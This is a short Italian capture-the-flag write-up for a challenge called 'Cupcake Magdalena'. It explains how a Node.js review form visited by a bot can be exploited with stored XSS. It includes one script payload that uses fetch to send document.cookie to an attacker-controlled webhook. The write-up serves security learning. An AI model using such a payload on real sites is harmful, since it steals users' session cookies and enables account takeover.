# Cupcake Magdalena

Sulla pagina principale si nota che possiamo visualizzare dei dettagli di cupcake e salvare la nostra recensione

![](./images/1-web-page.png)

Nel codice sorgente vediamo che questa è una app in node.js. Dentro /routes/index.js c'è la chiamata che salva le reviews

![](./images/2-fetch.png)

Questa funzione chiama la funzione visitPost dentro bot.js, la quale va a visitare il post appena creato tramite browser, settando come cookie la flag

![](./images/3-bot-func.png)

Questo vuol dire che possiamo provare un attacco XSS, prepariamo un server http con webhook.site per ricevere la flag

![](./images/4-webhook.png)

Aggiungiamo una recensione, dove nel campo review salviamo uno script che faccia una fetch al nostro webhook e che come parametro URL abbia il cookie di sessione: \<script>fetch('\<ip>/?c='+document.cookie)\</script>

![](./images/5-script.png)

Ora, in webhook aspettiamo la richiesta con la flag

![](./images/6-flag.png)